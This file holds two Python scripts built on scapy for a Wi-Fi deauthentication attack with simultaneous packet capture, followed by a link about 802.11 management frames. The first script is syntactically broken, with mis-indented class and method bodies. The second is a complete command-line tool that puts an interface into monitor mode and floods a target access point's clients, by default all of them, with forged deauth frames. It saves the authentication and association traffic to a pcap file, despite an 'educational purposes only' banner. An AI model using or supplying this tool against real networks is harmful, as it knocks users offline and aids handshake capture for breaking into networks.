
from scapy.all import *
import time

class deAuthCapture: 
    def __init__(self):
interface = None # "wlan0mon"  # Monitor mode interface
ap_mac = None # "XX:XX:XX:XX:XX:XX"  # Target AP MAC address
client_mac = None # "FF:FF:FF:FF:FF:FF"  # Broadcast MAC for all clients
pcap_file = None # "capture.pcap"
capture_duration = 10  # Seconds to capture packets


def send_deauth(self):
    print(f"Sending deauth packets to {client_mac} from AP {ap_mac}")
    deauth_pkt = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    sendp(deauth_pkt, iface=interface, count=10, inter=0.1, verbose=False)


def capture_packets(self):
    print(f"Capturing packets for {capture_duration} seconds...")
    packets = sniff(iface=interface, filter="type mgt subtype deauth or type mgt subtype assoc or type mgt subtype reassoc", timeout=capture_duration)
    wrpcap(pcap_file, packets)
    print(f"Packets saved to {pcap_file}")

if __name__ == "__main__":
try:
    deAuthCapture().send_deauth()
    deAuthCapture().capture_packets()
except PermissionError:
    print("Error: Run script as root (sudo).")
except Exception as e:
    print(f"Error: {e}")

from scapy.all import *
import argparse
import re
import subprocess
import threading
import time
import logging

class DeAuthCapture:
    def __init__(self, interface, ap_mac, client_mac, pcap_file, capture_duration):
        self.interface = interface
        self.ap_mac = ap_mac.upper()
        self.client_mac = client_mac.upper()
        self.pcap_file = pcap_file
        self.capture_duration = capture_duration
        self.logger = logging.getLogger(__name__)

    def validate_mac(self, mac):
        """Validate MAC address format."""
        return bool(re.match(r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$', mac))

    def check_monitor_mode(self):
        """Check if interface is in monitor mode."""
        try:
            result = subprocess.check_output(["iwconfig", self.interface], stderr=subprocess.STDOUT).decode()
            return "Mode:Monitor" in result
        except subprocess.CalledProcessError:
            return False

    def set_monitor_mode(self):
        """Attempt to set interface to monitor mode using airmon-ng."""
        try:
            self.logger.info(f"Setting {self.interface} to monitor mode...")
            subprocess.run(["sudo", "airmon-ng", "start", self.interface], check=True)
            self.interface = f"{self.interface}mon"  # Update to monitor interface
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set monitor mode: {e}")
            raise

    def set_channel(self, channel):
        """Set interface to the specified channel."""
        try:
            self.logger.info(f"Setting {self.interface} to channel {channel}")
            subprocess.run(["sudo", "iwconfig", self.interface, "channel", str(channel)], check=True)
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set channel: {e}")
            raise

    def send_deauth(self):
        """Send deauthentication packets."""
        if not (self.validate_mac(self.ap_mac) and self.validate_mac(self.client_mac)):
            self.logger.error("Invalid MAC address format")
            raise ValueError("Invalid MAC address")

        self.logger.info(f"Sending deauth packets to {self.client_mac} from AP {self.ap_mac}")
        deauth_pkt = RadioTap() / Dot11(
            addr1=self.client_mac, addr2=self.ap_mac, addr3=self.ap_mac
        ) / Dot11Deauth(reason=7)
        sendp(deauth_pkt, iface=self.interface, count=10, inter=0.1, verbose=False)
        self.logger.info("Deauth packets sent")

    def capture_packets(self):
        """Capture packets and save to PCAP."""
        self.logger.info(f"Capturing packets for {self.capture_duration} seconds...")
        packets = sniff(
            iface=self.interface,
            filter="type mgt subtype deauth or type mgt subtype auth or type mgt subtype assoc or type mgt subtype reassoc",
            timeout=self.capture_duration,
            prn=lambda x: self.logger.debug(f"Captured: {x.summary()}")
        )
        wrpcap(self.pcap_file, packets)
        self.logger.info(f"Captured {len(packets)} packets, saved to {self.pcap_file}")

    def run(self, channel=1):
        """Run deauth and capture concurrently."""
        if not self.check_monitor_mode():
            self.set_monitor_mode()
        self.set_channel(channel)

        # Run deauth and capture in parallel
        deauth_thread = threading.Thread(target=self.send_deauth)
        capture_thread = threading.Thread(target=self.capture_packets)

        deauth_thread.start()
        capture_thread.start()

        deauth_thread.join()
        capture_thread.join()

def main():
    # Ethical use disclaimer
    print("WARNING: This tool is for educational purposes only. Use only on networks you own or have explicit permission to test.")

    # Set up logging
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Automated deauthentication and packet capture tool")
    parser.add_argument("--interface", default="wlan0", help="Network interface (default: wlan0)")
    parser.add_argument("--ap-mac", required=True, help="Target AP MAC address")
    parser.add_argument("--client-mac", default="FF:FF:FF:FF:FF:FF", help="Client MAC address (default: broadcast)")
    parser.add_argument("--pcap-file", default="capture.pcap", help="Output PCAP file (default: capture.pcap)")
    parser.add_argument("--duration", type=int, default=10, help="Capture duration in seconds (default: 10)")
    parser.add_argument("--channel", type=int, default=1, help="Wi-Fi channel (default: 1)")
    args = parser.parse_args()

    try:
        tool = DeAuthCapture(
            args.interface, args.ap_mac, args.client_mac, args.pcap_file, args.duration
        )
        tool.run(channel=args.channel)
    except PermissionError:
        print("Error: Run script as root (sudo).")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()


    https://mrncciew.com/2014/09/29/cwap-802-11-mgmt-frame-types/
        deuth frames ^^
